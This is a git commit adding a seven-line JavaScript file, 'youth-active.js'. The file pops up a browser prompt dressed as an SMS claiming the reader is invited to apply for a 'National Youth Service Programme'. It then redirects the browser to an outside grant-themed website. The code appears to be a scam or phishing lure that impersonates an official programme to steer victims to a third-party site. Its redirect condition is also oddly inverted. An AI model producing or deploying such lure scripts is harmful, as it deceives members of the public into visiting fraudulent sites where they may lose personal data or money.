16b5459c684927d0e7e663cc1a2cab3888a1acd1
Sweetblogboi <nsiboy760@gmail.com>
2025-02-15 08:14:59 +0100

    Create youth-active.js

---
+++ youth-active.js
@@ -0,0 +1,7 @@
+
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You have been Invited to Apply for the NATIONAL YOUTH SERVICE PROGRAMME, Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://realgrant-2025.org/youth-programme.html';
+}
